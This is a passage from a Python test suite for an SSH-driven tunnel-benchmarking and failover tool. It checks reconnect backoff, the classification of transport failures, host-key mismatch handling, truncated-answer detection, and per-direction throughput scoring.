        # 4. Waiting: grows, stops growing at the cap, is never identical twice - and the bookkeeping
        #    around a re-open has to reflect the most recent one, not the worst one so far.
        waits = []
        tries = {"n": 0}

        def always_down():
            tries["n"] += 1
            raise ConnectionResetError(101, "Network is unreachable")

        with self.assertRaises(mock_ssh.TransientTransportError) as ctx:
            mock_ssh.open_session(always_down, sleep=waits.append, attempts=3)
        self.assertEqual(tries["n"], 3, "attempts counts connects, not waits")
        self.assertEqual(len(waits), 2, "one immediate try, then a wait before each retry")
        self.assertTrue(1.0 <= waits[0] < 2.0 and 2.0 <= waits[1] < 3.0,
                        f"the waits must grow 1s, 2s: {waits}")
        self.assertIn("3 attempt(s)", str(ctx.exception))
        long_waits = []
        with self.assertRaises(mock_ssh.TransientTransportError):
            mock_ssh.open_session(always_down, sleep=long_waits.append, attempts=7)
        self.assertTrue(15.0 <= long_waits[-1] < 16.0,
                        f"the backoff must stop growing at the cap: {long_waits}")
        self.assertGreater(len({round(mock_ssh.backoff_delay(0), 9) for _ in range(20)}), 1,
                           "without jitter both hosts re-open in lockstep and collide again")
        immediate = []
        self.assertEqual(mock_ssh.open_session(lambda: (immediate.append(1), "session")[1],
                                               sleep=lambda d: self.fail("a healthy connect pays no wait")),
                         "session")
        self.assertEqual(len(immediate), 1)
        # A refusal is a fact about the far side: no number of new sockets changes it.
        refused = []
        with self.assertRaises(PermissionError):
            mock_ssh.open_session(lambda: (_ for _ in ()).throw(PermissionError("auth failed")),
                                  sleep=refused.append, attempts=3)
        self.assertEqual(refused, [], "no backoff for a permanent failure")

        # A timeout is asymmetric, and the asymmetry is the point: a timeout while *establishing* a
        # session describes a path that did not answer, so it loops; a timeout while a command runs
        # describes a socket that is still open, so it does not (section 7).
        connect_tries, connect_waits = {"n": 0}, []

        def always_timeout():
            connect_tries["n"] += 1
            raise TimeoutError("timed out while connecting")

        with self.assertRaises(mock_ssh.TransientTransportError):
            mock_ssh.open_session(always_timeout, sleep=connect_waits.append, attempts=3)
        self.assertEqual(connect_tries["n"], 3, "a connect timeout is retried")
        self.assertEqual(len(connect_waits), 2, "with the same growing waits as any other flap")

        # A re-open that failed and a re-open that later succeeded must not be reported the same way.
        # `attempts=1` here keeps the sequence short: one try per re-open, so the first command finds
        # the connector down and the second finds it up.
        seq = {"n": 0}

        def flaky_connector():
            seq["n"] += 1
            if seq["n"] == 1:
                raise ConnectionResetError(101, "Network is unreachable")
            return FlappingRawClient()

        flaky_raw = FlappingRawClient(raises=[ConnectionResetError(104, "reset"),
                                              ConnectionResetError(104, "reset")])
        recovery = mock_ssh.SafeSSHRunner(flaky_raw, hostname="h", connector=flaky_connector,
                                          sleep=lambda d: None, attempts=1)
        with self.assertRaises(mock_ssh.TransientTransportError):
            recovery.run("systemctl is-active xray-portal", retryable=True)
        self.assertIsNotNone(recovery.last_reopen_error, "the reason the link would not come back")
        self.assertEqual(recovery.reconnects, 0)
        status, out, _ = recovery.run("systemctl is-active xray-portal", retryable=True)
        self.assertEqual((status, out), (0, "active\n"), "the next command finds the link up again")
        self.assertEqual((recovery.reconnects, recovery.reissued), (1, 1))
        self.assertIsNone(recovery.last_reopen_error,
                          "a cleared failure is the difference between 'the link is down' and "
                          "'the link was down'; a stale reason reads as an outage still in progress")

        # 5. Classification: which failures are worth another socket.
        class FakeSSHException(OSError):
            pass

        self.assertTrue(mock_ssh.is_transient_transport_failure(
            FakeSSHException("No existing session")), "paramiko's own class arrives through its name")
        for transient in (ConnectionResetError(104, "reset"), ConnectionAbortedError(),
                          BrokenPipeError(), OSError("unreachable"), EOFError("banner"),
                          ConnectionError("refused")):
            self.assertTrue(mock_ssh.is_transient_transport_failure(transient),
                            f"a dead socket is worth a new one: {type(transient).__name__}")
        for permanent in (mock_ssh.HostKeyMismatchError("MITM"), mock_ssh.TransientTransportError("spent"),
                          PermissionError("auth"), ValueError("bad"), TimeoutError(), RuntimeError("x")):
            self.assertFalse(mock_ssh.is_transient_transport_failure(permanent),
                             f"another session cannot fix this: {type(permanent).__name__}")
        # The banner incident is the reason HostKeyMismatchError exists as its own type: this failure
        # used to be raised as paramiko.SSHException, which the classifier above calls transient, so a
        # key change would have been retried three times and then reported as a network problem.
        host = f"test-tofu-flap-{int(time.time() * 1000)}.local"
        policy = mock_ssh.TOFUHostKeyPolicy()
        policy.missing_host_key(FakeClient(port=22), host, FakeKey("ssh-ed25519", "AAAAC3NzaC1lZDI1AAAA1"))
        with self.assertRaises(mock_ssh.HostKeyMismatchError):
            policy.missing_host_key(FakeClient(port=22), host, FakeKey("ssh-ed25519", "AAAAC3NzaC1lZDI1AAAA2"))

        # 6. A permanent failure mid-command must not open a session and must not be re-labelled.
        opened_after = []
        perm = mock_ssh.SafeSSHRunner(
            FlappingRawClient(raises=[PermissionError("Authentication failed")]), hostname="h",
            connector=lambda: (opened_after.append(1), FlappingRawClient())[1], sleep=lambda d: None)
        with self.assertRaises(PermissionError):
            perm.run("systemctl is-active xray-portal", retryable=True)
        self.assertEqual(opened_after, [], "an auth refusal is not fixed by a new socket")
        self.assertEqual((perm.reconnects, perm.reissued), (0, 0))

        hk_opens, hk_waits = [], []

        def hk_connector():
            hk_opens.append(1)
            return FlappingRawClient()

        hk = mock_ssh.SafeSSHRunner(
            FlappingRawClient(raises=[mock_ssh.HostKeyMismatchError("HOST KEY VERIFICATION FAILED")]),
            hostname="h", connector=hk_connector, sleep=hk_waits.append)
        with self.assertRaises(mock_ssh.HostKeyMismatchError):
            hk.run("ss -tlnp", retryable=True)
        self.assertEqual((hk_opens, hk_waits), ([], []),
                         "a key change must be reported immediately, not hammered at")

        # 7. A timeout is not a dropped session: the socket is still up, and the message has to name
        #    the command and the budget it ran out of (the live rows that read "Execution error: " with
        #    nothing after it were the old behaviour).
        t_opens = []
        timed = mock_ssh.SafeSSHRunner(FlappingRawClient(raises=[TimeoutError()]), hostname="h",
                                       connector=lambda: (t_opens.append(1), FlappingRawClient())[1],
                                       sleep=lambda d: None)
        with self.assertRaises(TimeoutError) as ctx:
            timed.run(probe.cmd("lat", "127.0.0.1", 9443), retryable=True)
        self.assertIn("timed out after 30s", str(ctx.exception))
        self.assertIn("best_probe.py", str(ctx.exception))
        self.assertEqual(t_opens, [], "no re-open for a command that is still running somewhere")
        self.assertEqual((timed.reconnects, timed.reissued), (0, 0))

        # 8. best_effort means "a non-zero exit is expected", never "the host was unreachable". Getting
        #    this backwards is how a dead SSH session would read as a dead unit, and a monitor would
        #    switch protocols to heal its own connection.
        unreach = mock_ssh.SafeSSHRunner(FlappingRawClient(raises=[EOFError("Error reading SSH protocol "
                                                                           "banner")]), hostname="h")
        with self.assertRaises(mock_ssh.TransientTransportError) as ctx:
            unreach.run("systemctl is-active xray-portal", best_effort=True, retryable=True)
        self.assertIn("this transport has no connector", str(ctx.exception),
                      "and the message has to say why nothing could be re-opened")
        answered = mock_ssh.SafeSSHRunner(FlappingRawClient(response="", exit_status=1), hostname="h")
        self.assertEqual(answered.run("ss -tlnp | grep -E ':9443 '", best_effort=True, retryable=True),
                         (1, "", ""), "a host that answers 'nothing listening' is not a transport fault")

        # 9. Both transports answer one signature: a caller that passes retryable=True must work on the
        #    mock too, or every dry-run test would take a different path from a live run.
        mock_client = mock_ssh.MockSSHClient(host_role="iran")
        self.assertEqual(len(mock_client.run("systemctl is-active xray-portal", best_effort=True,
                                             retryable=True)), 3)
        self.assertEqual(mock_ssh.transport_flaps(mock_client, None), {},
                         "a mock never flapped, so it reports nothing")

        # 10. A pair whose second session will not open must not leak the first one.
        pair = {"id": 0, "name": "flap", "frontend": 9443, "frontend_port": 9443,
                "iran": {"host": "198.51.100.10", "port": 22, "auth": {"value": "x"}},
                "foreign": {"host": "203.0.113.20", "port": 22, "auth": {"value": "x"}},
                "base_rtt_ms": 30.0}
        pid = storage.add_pair(name=f"flap-{int(time.time() * 1000)}", iran_host="198.51.100.10",
                               foreign_host="203.0.113.20", frontend_port=9443)
        self.addCleanup(storage.delete_pair, pid)
        pair["id"] = pid

        real_get_runner = engine.get_ssh_runner
        half = []

        def half_broken(spec, dry_run=None, host_role="unknown"):
            if host_role == "foreign":
                raise ConnectionResetError("Error reading SSH protocol banner")
            made = mock_ssh.MockSSHClient(host_role=host_role)
            half.append(made)
            return made

        engine.get_ssh_runner = half_broken
        try:
            with self.assertRaises(ConnectionError):
                engine._open_pair_sessions(pair, dry_run=True)
        finally:
            engine.get_ssh_runner = real_get_runner
        self.assertEqual(len(half), 1, "only the Iran session ever existed")
        self.assertTrue(all(not c.connected for c in half),
                        "the half-open pair closed the session it had already opened")

        # 11. The sweep survives the transport. Two protocols, and the second host session of the first
        #     protocol fails: the run still returns two rows, the failed one is recorded as
        #     not-measurable (not slow), and it cannot outrank the protocol that was measured.
        real_supported = protocols.get_supported_protocols
        protocols.get_supported_protocols = lambda: ["chisel-wss", "wstunnel-v10"]
        counts = {"iran": 0, "foreign": 0}

        def one_bad_protocol(spec, dry_run=None, host_role="unknown"):
            counts[host_role] += 1
            if host_role == "iran" and counts["iran"] == 2:
                raise ConnectionResetError(f"Error reading SSH protocol banner from {spec['host']}")
            return mock_ssh.MockSSHClient(host_role=host_role)

        engine.get_ssh_runner = one_bad_protocol
        try:
            rows = engine.run_all_benchmarks(dict(pair), dry_run=True, run_id="run-t65a")
        finally:
            engine.get_ssh_runner = real_get_runner
            protocols.get_supported_protocols = real_supported
        self.assertEqual(len(rows), 2, "one unreachable protocol must not delete the other row")
        broken = [r for r in rows if r.get("transport_error")]
        self.assertEqual(len(broken), 1)
        self.assertEqual(broken[0]["protocol"], "chisel-wss")
        self.assertTrue(broken[0]["not_measurable"] and broken[0]["disqualified"])
        self.assertEqual(broken[0]["score"], 0.0, "an unmeasured tunnel is not a slow tunnel")
        self.assertIn("SSH_UNREACHABLE", broken[0]["dq_reasons"][0])
        self.assertIn("[addr]", broken[0]["dq_reasons"][0],
                      "the failure names what went wrong without publishing the host")
        self.assertNotIn("198.51.100.10", str(rows))
        self.assertEqual(rows[0]["protocol"], "wstunnel-v10", "the measured row still ranks first")
        persisted = [b for b in storage.get_benchmarks(pid) if b.get("run_id") == "run-t65a"]
        self.assertEqual(len(persisted), 2, "both rows are persisted, not just returned")

        # 12. And with no host reachable at all, the base-RTT phase degrades instead of ending the run:
        #     that is the exact shape of the first live sweep's death, which lost every row it had
        #     already measured.
        def all_down(spec, dry_run=None, host_role="unknown"):
            raise ConnectionResetError(f"Cannot connect to host {spec['host']} port 22: timed out")

        protocols.get_supported_protocols = lambda: ["chisel-wss", "wstunnel-v10"]
        engine.get_ssh_runner = all_down
        try:
            dark = engine.run_all_benchmarks(dict(pair), dry_run=True, run_id="run-t65b")
        finally:
            engine.get_ssh_runner = real_get_runner
            protocols.get_supported_protocols = real_supported
        self.assertEqual(len(dark), 2, "an unreachable pair produces two honest rows, not zero")
        self.assertTrue(all(r.get("transport_error") and r["not_measurable"] for r in dark))
        self.assertEqual([r["base_rtt_ms"] for r in dark], [0.0, 0.0])
        self.assertIn("same transport failure seen while measuring base RTT", dark[0]["dq_reasons"][0],
                      "the correlation is the diagnosis: one link, not two broken tunnels")
        self.assertNotIn("203.0.113.20", str(dark))
        self.assertEqual(storage.get_pair(pid)["base_rtt_ms"], 0.0)
        self.assertTrue(any(r["action"] == "BASE_RTT" and "FALLBACK" in r["details"]
                            for r in storage.get_audit_logs(limit=200)),
                        "the baseline is audited as a fallback, never as a measurement")

        # 13. Transparency: a number measured across a link that had to be re-opened is different
        #     evidence, and both consumers say so. Counters here are set on the mock because the mock
        #     cannot drop a session; the monitor pass below produces them for real.
        noisy = mock_ssh.MockSSHClient(host_role="iran")
        noisy.reconnects, noisy.reissued = 2, 1
        quiet_ir = mock_ssh.MockSSHClient(host_role="iran")
        noisy_row = engine.run_single_benchmark(dict(pair), "chisel-wss", dry_run=True,
                                                ir_runner=noisy,
                                                fr_runner=mock_ssh.MockSSHClient(host_role="foreign"))
        quiet_row = engine.run_single_benchmark(dict(pair), "chisel-wss", dry_run=True,
                                                ir_runner=quiet_ir,
                                                fr_runner=mock_ssh.MockSSHClient(host_role="foreign"))
        self.assertGreater(noisy_row["score"], 0.0,
                           "this is the success path: a number survived the flaps and is still scored")
        self.assertEqual(noisy_row.get("transport"), {"reconnects": 2, "reissued": 1})
        self.assertNotIn("transport", quiet_row, "a quiet pass must not print a transport figure")

        storage.update_pair_status(pid, status="ACTIVE", active_tunnel="chisel-wss")
        stored = [p for p in failover_monitor.pairs_from_storage() if p["id"] == pid]
        self.assertEqual(len(stored), 1)

        class NoopManager:
            def evaluate_and_heal(self, pair, **kwargs):
                raise AssertionError("a HEALTHY sample must never reach the heal path")

        # The descriptor again (see the same pin in test_64).
        real_check = failover.TunnelHealthChecker.__dict__["check_health"]

        def reading_check(ir, fr, pair_arg, active, base_rtt=0.0, dry_run=False):
            # Reads the transport the way the real checker does, so the reconnect counters below are
            # produced by an actual drop rather than asserted about one.
            for side in (ir, fr):
                side.run(f"systemctl is-active {active}", best_effort=True, retryable=True)
            return failover.TunnelHealthReport(
                status="HEALTHY", loss_pct=0.0, latency_ms=50.0, overhead_ratio=1.0,
                is_unit_active_iran=True, is_unit_active_foreign=True, is_socket_listening=True,
                details="stub read")

        failover.TunnelHealthChecker.check_health = staticmethod(reading_check)
        self.addCleanup(setattr, failover.TunnelHealthChecker, "check_health", real_check)

        def flapping(spec, dry_run=None, host_role="unknown"):
            return mock_ssh.SafeSSHRunner(
                FlappingRawClient(raises=[ConnectionResetError(104, "Connection reset by peer")]),
                hostname=spec.get("host"), connector=FlappingRawClient, sleep=lambda d: None)

        flaky_mon = failover_monitor.FailoverMonitor(
            manager=NoopManager(),
            policy=failover_monitor.MonitorPolicy(interval_seconds=1, down_streak=3),
            pair_source=lambda: stored, runner_factory=flapping,
            host_guard=failover_monitor.NullHostGuard(), dry_run=True)
        verdict = flaky_mon.run_once(auto_heal=False)[0]
        self.assertEqual(verdict["action"], "HEALTHY")
        self.assertEqual(verdict["transport"], {"reconnects": 2, "reissued": 2},
                         "both sides dropped and both recovered inside one pass")

        calm_mon = failover_monitor.FailoverMonitor(
            manager=NoopManager(),
            policy=failover_monitor.MonitorPolicy(interval_seconds=1, down_streak=3),
            pair_source=lambda: stored,
            runner_factory=lambda spec, dry_run=None, host_role="unknown":
            mock_ssh.MockSSHClient(host_role=host_role),
            host_guard=failover_monitor.NullHostGuard(), dry_run=True)
        self.assertNotIn("transport", calm_mon.run_once(auto_heal=False)[0],
                         "a quiet pass looks quiet on purpose")

        # 14. The two shapes a dead session arrives in. Both report themselves through
        #     `get_transport()` and neither failure carries a network exception name, which is why
        #     `_session_gone()` is asked twice: before anything is written (a session that was already
        #     down provably did not run the command) and again after an AttributeError (the write was in
        #     progress, so nobody can prove what reached the far side).
        class ShapedClient:
            """A paramiko-shaped session: transport-reporting, scripted answers, can die mid-send.

            `drop_after` makes the Nth exec_command raise the live crash verbatim,
            `AttributeError: 'NoneType' object has no attribute 'open_session'`, and leaves the
            transport reporting itself down afterwards. `dies_under_read` is the third shape: the
            request goes out, the channel opens, and the session dies while the answer is still
            arriving - so the caller holds a truncated stream and an exit status that never came.
            `cut_answer` is its mirror: the exit status did arrive and the session died under the
            stream. A client that starts out dead answers normally
            here on purpose: the control under test is that the code refuses to use it, not that
            paramiko would have thrown.
            """

            class _Transport:
                def __init__(self, owner):
                    self._owner = owner

                def is_active(self):
                    return self._owner.alive

            def __init__(self, alive=True, script=(), default="active\n", drop_after=None, bug=None,
                         dies_under_read=None, cut_answer=None):
                self.alive = alive
                self.script = list(script)
                self.default = default
                self.drop_after = drop_after
                self.bug = bug
                self.dies_under_read = dies_under_read
                self.cut_answer = cut_answer
                self.commands = []
                self.closed = False

            def get_transport(self):
                return ShapedClient._Transport(self)

            def exec_command(self, cmd, timeout=30):
                if self.bug is not None and len(self.commands) == self.bug[1]:
                    raise AttributeError(self.bug[0])
                if self.drop_after is not None and len(self.commands) == self.drop_after:
                    self.commands.append(cmd)
                    self.alive = False
                    raise AttributeError("'NoneType' object has no attribute 'open_session'")
                self.commands.append(cmd)
                out = next((r for needle, r in self.script if needle in cmd), self.default)
                stdout = mock_ssh.MockChannelFile(out)
                if self.dies_under_read is not None and len(self.commands) - 1 == self.dies_under_read:
                    # Paramiko 5.0's force-close path: the reader thread dies, `Transport.run` calls
                    # `chan._unlink()` -> `_set_closed()`, which wakes the exit-status wait with the
                    # *initial* -1 and leaves the stream short. The command reached the host; the
                    # answer did not finish arriving.
                    stdout.channel = mock_ssh.MockChannel(-1)
                    self.alive = False
                elif self.cut_answer is not None and len(self.commands) - 1 == self.cut_answer:
                    # The second half of the same hazard: the host did say how the command ended, and
                    # the session died while the stream was still arriving. An exit status is not a
                    # finished answer.
                    self.alive = False
                return None, stdout, mock_ssh.MockChannelFile("")

            def close(self):
                self.closed = True

        #    (a) the transport reports itself down: the session is replaced and the dead one is never
        #        handed the command, whatever it would have answered.
        untrusted = ShapedClient(alive=False)
        replaced = []
        runner_a = mock_ssh.SafeSSHRunner(
            untrusted, hostname="198.51.100.10",
            connector=lambda: (replaced.append(ShapedClient()), replaced[-1])[1], sleep=lambda d: None)
        self.assertEqual(runner_a.run("systemctl is-active xray-portal", retryable=True)[:2],
                         (0, "active\n"), "the recovered read returns its real answer")
        self.assertEqual(untrusted.commands, [], "the pre-check is what keeps a dead session unused")
        self.assertEqual((runner_a.reconnects, runner_a.reissued), (1, 1))

        #    (b) the live crash: the session dies while the command is being written. Nothing in that
        #        exception name says network, so untranslated it escapes as an unclassified bug.
        raced = ShapedClient(drop_after=0)
        back_b = []
        runner_b = mock_ssh.SafeSSHRunner(
            raced, hostname="198.51.100.10",
            connector=lambda: (back_b.append(ShapedClient()), back_b[-1])[1], sleep=lambda d: None)
        self.assertEqual(runner_b.run("ss -tlnp", retryable=True)[1], "active\n")
        self.assertEqual(raced.commands, ["ss -tlnp"], "the read did reach the session that died")
        self.assertEqual(back_b[0].commands, ["ss -tlnp"], "and it is issued again on the one that did not")

        #    (c) the two shapes must not read alike to an operator, because they need different fixes:
        #        a half-run deploy is indeterminate, a never-started one is not.
        half_run = mock_ssh.SafeSSHRunner(ShapedClient(drop_after=0), hostname="h")
        with self.assertRaises(mock_ssh.TransientTransportError) as ctx:
            half_run.run("systemctl restart frps", retryable=True)
        self.assertIn("outcome of any already-sent side effect is unknown", str(ctx.exception),
                      "the write was in progress, so the restart may have happened")
        never_ran = mock_ssh.SafeSSHRunner(ShapedClient(alive=False), hostname="h")
        with self.assertRaises(mock_ssh.TransientTransportError) as ctx:
            never_ran.run("systemctl restart frps", retryable=True)
        self.assertIn("the session was already down, so this was never sent", str(ctx.exception))
        self.assertNotIn("already-sent side effect", str(ctx.exception),
                         "a command that provably never left must not be reported as an indeterminate "
                         "deploy, or the operator goes looking for a half-started tunnel")

        #    (d) an AttributeError with the session still up is our bug, not a flap.
        ours = ShapedClient(bug=("'SafeSSHRunner' object has no attribute 'typo'", 0))
        opened_d = []
        runner_d = mock_ssh.SafeSSHRunner(ours, hostname="h",
                                         connector=lambda: (opened_d.append(1), ShapedClient())[1],
                                         sleep=lambda d: None)
        with self.assertRaises(AttributeError):
            runner_d.run("ss -tlnp", retryable=True)
        self.assertEqual(opened_d, [], "a new session cannot fix a coding bug, and must not bury it")

        #    (e) a re-open that meets a changed host key is raised, not swallowed into a transport
        #        error. Opening three fresh sessions against a machine that just presented a new key is
        #        the one behaviour this class must never have, and it is only caught here because the
        #        key changes *after* the session dropped.
        mitm = mock_ssh.SafeSSHRunner(FlappingRawClient(raises=[ConnectionResetError(104, "reset")]),
                                      hostname="h",
                                      connector=lambda: (_ for _ in ()).throw(
                                          mock_ssh.HostKeyMismatchError("HOST KEY VERIFICATION FAILED")),
                                      sleep=lambda d: None)
        with self.assertRaises(mock_ssh.HostKeyMismatchError):
            mitm.run("systemctl is-active xray-portal", retryable=True)
        self.assertEqual(mitm.reconnects, 0, "no session was established on the new key")

        # 15. The wiring rather than the primitive. Everything above proves SafeSSHRunner *can*
        #     recover; none of it proves the product asks, and a caller that forgets retryable=True
        #     silently keeps the old behaviour. These are the two reads a flap used to cost: the
        #     engine's socket inspection and the monitor's entire health sample.
        listen_line = 'LISTEN 0 4096 *:9443 users:(("xray",pid=4242,fd=7))\n'
        script = [("ss -tlnp", listen_line), ("ss -tinp", ""), ("systemctl is-active", "active\n"),
                  ("BEST_PROBE_PRESENT", "BEST_PROBE_PRESENT\n"),
                  ("probe.py loss", "LOSS:0.0\n"), ("probe.py lat", "AVG:52.0\n")]
        # Both socket reads are pinned separately, one flap position per call site: deleting
        # `retryable=True` from either of them has to fail here, not go unnoticed.
        for flap_on, read in ((0, "ss -tlnp | grep -E ':9443 '"), (1, "ss -tinp 'sport = :9443'")):
            port_dead = ShapedClient(script=script, drop_after=flap_on)
            port_back = []
            port_runner = mock_ssh.SafeSSHRunner(
                port_dead, hostname="198.51.100.10",
                connector=lambda: (port_back.append(ShapedClient(script=script)), port_back[-1])[1],
                sleep=lambda d: None)
            info = engine.check_port_status(port_runner, 9443)
            self.assertTrue(info["is_listening"] and info["pid"] == "4242",
                            f"the verdict is a real reading, not an empty answer: {info}")
            self.assertEqual(port_back[0].commands[0], read, f"the flap cost the {read} read")
            self.assertEqual((port_runner.reconnects, port_runner.reissued), (1, 1),
                             "the engine's socket read asks to be recovered; remove its retryable=True "
                             "and this is the assertion that fails")

        ir_dead = ShapedClient(script=script, drop_after=0)
        ir_back = []
        ir_live = mock_ssh.SafeSSHRunner(
            ir_dead, hostname="198.51.100.10",
            connector=lambda: (ir_back.append(ShapedClient(script=script)), ir_back[-1])[1],
            sleep=lambda d: None)
        fr_live = mock_ssh.SafeSSHRunner(ShapedClient(script=script), hostname="203.0.113.20")
        report = failover.TunnelHealthChecker.check_health(
            ir_live, fr_live, dict(pair, frontend_port=9443), "chisel-wss", base_rtt=50.0, dry_run=True)
        self.assertEqual(report.status, "HEALTHY",
                         f"a session that dropped mid-check is not an outage: {report.details}")
        self.assertTrue(report.is_unit_active_iran and report.is_socket_listening)
        self.assertEqual((ir_live.reconnects, ir_live.reissued), (1, 1))
        self.assertEqual(len(ir_dead.commands), 1, "the flap landed on the first read of the sample")
        self.assertTrue(ir_dead.commands[0].startswith("systemctl is-active"),
                        "and that read is one the checker is allowed to re-issue")

        #    An unrecoverable drop inside a health check is an error, never a DOWN verdict: DOWN is
        #    what authorises a switchover, and this is the exact shape of the monitor healing its own
        #    SSH session.
        dark = mock_ssh.SafeSSHRunner(ShapedClient(script=script, drop_after=0), hostname="h")
        with self.assertRaises(mock_ssh.TransientTransportError):
            failover.TunnelHealthChecker.check_health(
                dark, fr_live, dict(pair, frontend_port=9443), "chisel-wss", base_rtt=50.0, dry_run=True)

        # 16. The third shape, which only a live link could give me. A real `close()` makes paramiko
        #     report the transport dead *before* the send, so report053's hardware witness could only
        #     ever produce "never sent"; tearing the TCP session down out-of-band - what a censor's RST
        #     and a banner flap actually do - dies in the send window or in the *read* window.
        #     `scratch/live_midsend_witness.py` measured the read window on 2026-10-11 as an answer that
        #     looked finished: `(-1, 106 truncated bytes, '')` handed back to the caller while the file
        #     the command wrote already existed on the far side. -1 is paramiko's *initial* `exit_status`
        #     and is only rewritten by a real exit-status message, so it means "the host never said how
        #     this ended" - and a health checker handed that tuple reads a short answer to
        #     `systemctl is-active` as a dead unit, which is the failover-by-network-flap report052 was
        #     written to prevent.
        truncated = ("PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n"
                     "64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.043 ms\n")
        complete = truncated + "--- 127.0.0.1 ping statistics ---\n" \
                               "2 packets transmitted, 2 received, 0% packet loss\n"
        cut_script = [("ping -c 2", truncated)]
        whole_script = [("ping -c 2", complete), ("systemctl is-active", "active\n")]

        #    (a) a mutating command whose answer was cut short is indeterminate, and the flag has to
        #        say so: the side effect demonstrably ran, so "never sent" would send the operator
        #        looking for a deploy that already happened.
        cut = mock_ssh.SafeSSHRunner(ShapedClient(script=cut_script, dies_under_read=0), hostname="h")
        with self.assertRaises(mock_ssh.TransientTransportError) as ctx:
            cut.run("touch /tmp/bt-midsend-1791669313-1.txt", retryable=True)
        cause = ctx.exception.args[1]
        self.assertIsInstance(cause, mock_ssh.DeadSessionError)
        self.assertTrue(cause.may_have_been_sent, "the command reached the host, the answer did not")
        self.assertIn("died while reading the answer", str(cause))
        self.assertIn("outcome of any already-sent side effect is unknown", str(ctx.exception))
        self.assertNotIn("so this was never sent", str(ctx.exception))

        #    (b) best_effort must not launder it. This is the exact call shape the monitor's probes use,
        #        and the only honest outcomes are a re-measured answer or a raised transport error.
        probe_cut = ShapedClient(script=cut_script, dies_under_read=0)
        back = []
        probe_runner = mock_ssh.SafeSSHRunner(
            probe_cut, hostname="198.51.100.10",
            connector=lambda: (back.append(ShapedClient(script=whole_script)), back[-1])[1],
            sleep=lambda d: None)
        status, out, _err = probe_runner.run("ping -c 2 127.0.0.1", best_effort=True, retryable=True)
        self.assertEqual(out, complete, "the caller gets the re-measured answer, never the truncated one")
        self.assertEqual((probe_runner.reconnects, probe_runner.reissued), (1, 1))
        self.assertEqual(back[0].commands, ["ping -c 2 127.0.0.1"],
                         "the read that was cut short is the one that was issued again")

        #    (c) an exit status that never arrives is refused even with the transport still reporting
        #        itself up: -1 is not something the host said, it is the absence of an answer.
        class SilentClose(ShapedClient):
            def exec_command(self, cmd, timeout=30):
                _stdin, stdout, stderr = super().exec_command(cmd, timeout=timeout)
                stdout.channel = mock_ssh.MockChannel(-1)
                return _stdin, stdout, stderr

        silent = mock_ssh.SafeSSHRunner(SilentClose(script=cut_script), hostname="h")
        with self.assertRaises(mock_ssh.TransientTransportError) as ctx:
            silent.run("ping -c 2 127.0.0.1", best_effort=True)
        self.assertIn("exit status never arrived", str(ctx.exception))

        #    (d) an exit status is not a finished answer: when the session dies under the read after
        #        the host said "0", the output above it may still be short, and the caller cannot tell.
        cut_zero = mock_ssh.SafeSSHRunner(ShapedClient(script=cut_script, cut_answer=0), hostname="h")
        with self.assertRaises(mock_ssh.TransientTransportError) as ctx:
            cut_zero.run("ping -c 2 127.0.0.1", best_effort=True)
        self.assertIn("exit status 0", str(ctx.exception),
                      "the host answered 0 and the session died under the stream: the answer above it "
                      "may still be short")
        self.assertNotIn("exit status never arrived", str(ctx.exception))

        #    (e) and the guard must stay a truncation detector rather than a paranoia switch: a complete
        #        answer over a live session returns normally, or every measurement in the product would
        #        start failing.
        healthy = mock_ssh.SafeSSHRunner(ShapedClient(script=whole_script), hostname="h")
        self.assertEqual(healthy.run("ping -c 2 127.0.0.1", retryable=True)[:2], (0, complete),
                         "a full answer on a live session is a measurement, not a flap")

    def test_66_capacity_names_a_direction_and_the_table_keeps_both(self):
        """Agenda #38. The live GRE row was measured 1124.19 Mbps one way and 6.50 Mbps the other, and
        the product stored and scored 565.35 - a midpoint no user ever experienced, carrying 40% of the
        ultraspeed score. Two things had to change, and both had to be pinned on the *call path*, because
        a helper that computes the right number while the engine publishes the old one is exactly the
        defect the previous round's mutation harness caught:

        1. the scalar is the weakest *measured* direction, so a measured 0.0 must not be mistaken for
           "no data" and fall through to the discrete ladder score;
        2. the benchmark table keeps each leg as its own column, so a reader after the fact can see the
           asymmetry instead of trusting one number - including in rows written before this existed.
        """
        Gbps = 1_000_000.0

        def doc(sent=None, recv=None):
            end = {}
            if sent is not None:
                end["sum_sent"] = {"bits_per_second": sent, "retransmits": 2}
            if recv is not None:
                end["sum_received"] = {"bits_per_second": recv}
            return {"end": end}

        class LeggedClient(mock_ssh.MockSSHClient):
            """Answers the two iperf3 legs with whatever the case needs, everything else as the mock."""

            def __init__(self, legs, **kw):
                super().__init__(**kw)
                self.legs = legs
                self.raised = set()

            def run(self, cmd, check=True, best_effort=False, timeout=30, retryable=False):
                if "iperf3 -c" in cmd:
                    side = "reverse" if " -R" in cmd else "forward"
                    if isinstance(self.legs[side], Exception):
                        raise self.legs[side]
                    return (0, json.dumps(self.legs[side]), "")
                return super().run(cmd, check=check, best_effort=best_effort, timeout=timeout,
                                   retryable=retryable)

        pair = {"id": 138, "name": "per_leg", "frontend": 443,
                "iran": {"host": "198.51.100.10", "port": 22},
                "foreign": {"host": "203.0.113.20", "port": 22}}

        # ---- 1. The scoring boundary: measured-zero is not the same fact as never-measured.
        starved = scoring.evaluate_tunnel_metrics(45.0, 2.0, 4, 28.5, 0.0, profile="ultraspeed",
                                                 throughput_mbps=0.0, throughput_measured=True)
        absent = scoring.evaluate_tunnel_metrics(45.0, 2.0, 4, 28.5, 0.0, profile="ultraspeed",
                                                throughput_mbps=0.0, throughput_measured=False)
        self.assertEqual(starved["breakdown"]["s_bulk"], 0.0,
                         "a direction measured at zero must score zero, not the ladder step")
        self.assertEqual(absent["breakdown"]["s_bulk"], 1.0,
                         "and only a genuinely unmeasured run may fall back to the discrete ladder")
        self.assertGreater(starved["score"], 0.0)
        self.assertLess(starved["score"], absent["score"],
                         f"the throughput weight must actually move: {starved['score']} vs "
                         f"{absent['score']}")
        self.assertTrue(starved["breakdown"]["throughput_measured"])
        self.assertFalse(absent["breakdown"]["throughput_measured"])
        # Callers written before the split passed no flag and meant "0 means no data".
        legacy = scoring.evaluate_tunnel_metrics(45.0, 2.0, 4, 28.5, 0.0, profile="ultraspeed",
                                                throughput_mbps=0.0)
        self.assertEqual(legacy["breakdown"]["s_bulk"], absent["breakdown"]["s_bulk"],
                         "omitting the flag keeps the old reading, so no pre-split caller changes meaning")

        # ---- 2. The engine publishes the weak direction, and the table keeps both legs.
        asym = LeggedClient({"forward": doc(sent=1124.19 * Gbps), "reverse": doc(recv=6.5 * Gbps)},
                           host_role="iran")
